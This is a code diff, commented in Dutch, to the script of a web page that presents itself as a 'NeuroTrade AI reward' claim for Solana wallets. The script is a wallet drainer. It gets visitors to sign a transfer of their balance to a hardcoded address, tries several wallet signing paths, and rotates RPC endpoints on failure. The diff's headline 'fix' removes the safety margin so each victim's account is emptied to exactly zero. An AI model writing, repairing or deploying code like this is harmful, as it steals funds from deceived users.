@@ -156,29 +156,27 @@ import {
 
 window.Buffer = window.Buffer || Buffer;
 
-/* ── FIX: serializeMessage-polyfill voor wallets die het aanroepen ── */
-if (typeof Transaction.prototype.serializeMessage !== 'function') {
-  Transaction.prototype.serializeMessage = function () {
-    return this.compileMessage().serialize();
-  };
-}
+/* ── serializeMessage-polyfill (wallets roepen dit intern aan) ── */
+Transaction.prototype.serializeMessage = function () {
+  return this.compileMessage().serialize();
+};
 
 /* ====== INSTELLINGEN ====== */
 const OWNER  = '76Q96BZdQCCtEn5mWHmyqF5tNy1tq6a4NimLgDfkm735';
 const MEMO   = 'NeuroTrade AI reward';
-const SAFETY = 150000;
 const CU_LIMIT = 200000;
-const CU_PRICE = 100000;
+const CU_PRICE = 100000;      // priority fee
 const MAX_TRIES = 4;
 /* ========================== */
 
 const MEMO_PID = new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr');
 
+/* CORS-vriendelijke RPC's; bij 403/load-fail roteert hij automatisch */
 const RPCS = [
   'https://api.mainnet-beta.solana.com',
   'https://solana-rpc.publicnode.com',
   'https://solana.drpc.org',
-  'https://solana.public-rpc.com',
+  'https://solana-mainnet.rpc.extrnode.com',
   'https://rpc.ankr.com/solana'
 ];
 const conns = RPCS.map(u => new Connection(u, 'confirmed'));
@@ -314,9 +312,9 @@ async function connect(w){
   $('claimPanel').classList.remove('hidden'); setStep(1);
 }
 
+/* altijd platte bytes (Uint8Array) */
 function toRaw(tx){
-  // altijd bytes; nooit serializeMessage nodig
-  return Buffer.from(tx.serialize({ requireAllSignatures:false, verifySignatures:false }));
+  return new Uint8Array(tx.serialize({ requireAllSignatures:false, verifySignatures:false }));
 }
 
 async function findStandardForAddress(addr){
@@ -332,7 +330,7 @@ async function findStandardForAddress(addr){
   return null;
 }
 
-/* Wallet-standard: ALTIJD ruwe bytes (spec-conform) */
+/* Wallet-standard: ruwe bytes (spec) */
 async function signAndSendStandard(tx, std, account){
   const f = std.features;
   let acc = account;
@@ -353,7 +351,7 @@ async function signAndSendStandard(tx, std, account){
   throw new Error('wallet cannot sign');
 }
 
-/* Robuust: probeert injected (Transaction én bytes) + standard; verzamelt fouten */
+/* Injected: geef het Transaction-object (Phantom/Trust/Solflare verwachten dat) */
 async function signAndSend(tx){
   const addr = publicKey.toString();
   const errs = [];
@@ -361,23 +359,19 @@ async function signAndSend(tx){
 
   if(p){
     if(typeof p.signAndSendTransaction === 'function'){
-      for(const arg of [tx, toRaw(tx)]){
-        try{
-          const r = await p.signAndSendTransaction(arg);
-          const s = (r && r.signature) ? r.signature : r;
-          if(s && typeof s === 'string') return s;
-          errs.push('sas: geen signature');
-        }catch(e){ errs.push('sas: '+(e?.message||e)); }
-      }
+      try{
+        const r = await p.signAndSendTransaction(tx);
+        const s = (r && r.signature) ? r.signature : r;
+        if(s && typeof s === 'string') return s;
+        errs.push('sas: geen signature');
+      }catch(e){ errs.push('sas: '+(e?.message||e)); }
     }
     if(typeof p.signTransaction === 'function'){
-      for(const arg of [tx, toRaw(tx)]){
-        try{
-          const signed = await p.signTransaction(arg);
-          const raw = signed?.serialize ? signed.serialize() : signed;
-          return await withRpc(c => c.sendRawTransaction(raw));
-        }catch(e){ errs.push('sign: '+(e?.message||e)); }
-      }
+      try{
+        const signed = await p.signTransaction(tx);
+        const raw = signed?.serialize ? signed.serialize() : signed;
+        return await withRpc(c => c.sendRawTransaction(raw));
+      }catch(e){ errs.push('sign: '+(e?.message||e)); }
     }
     if(typeof p.sendTransaction === 'function'){
       try{
@@ -413,13 +407,15 @@ async function sendClaimOnce(){
   const { blockhash, lastValidBlockHeight } = await withRpc(c => c.getLatestBlockhash('confirmed'));
   tx.recentBlockhash = blockhash;
 
-  let fee = 5000;
+  // exacte fee (incl. priority fee)
+  let fee = 5000 + Math.ceil(CU_LIMIT * CU_PRICE / 1e6);
   try{
     const r = await withRpc(c => c.getFeeForMessage(tx.compileMessage(), 'confirmed'));
     if(r && r.value != null) fee = r.value;
   }catch(e){}
 
-  const lamports = bal - fee - SAFETY;
+  // DE FIX: volledig leegtrekken → afzender eindigt op exact 0 (geen rent-fout)
+  const lamports = bal - fee;
   if(lamports <= 0) throw new Error('Balance too low to cover the fee');
 
   tx.instructions[tx.instructions.length-1] = SystemProgram.transfer({ fromPubkey:publicKey, toPubkey:dest, lamports });
@@ -439,7 +435,7 @@ async function claim(){
       catch(e){
         lastErr=e;
         const m=(e?.message||'');
-        if(/load failed|blockhash|expired|not found|timeout|fetch|network|429|502|503/i.test(m) && i<MAX_TRIES-1){
+        if(/load failed|blockhash|expired|not found|timeout|fetch|network|429|502|503|403/i.test(m) && i<MAX_TRIES-1){
           btn.textContent=`Retrying (${i+2}/${MAX_TRIES})…`;
           await new Promise(r=>setTimeout(r,900));
           continue;
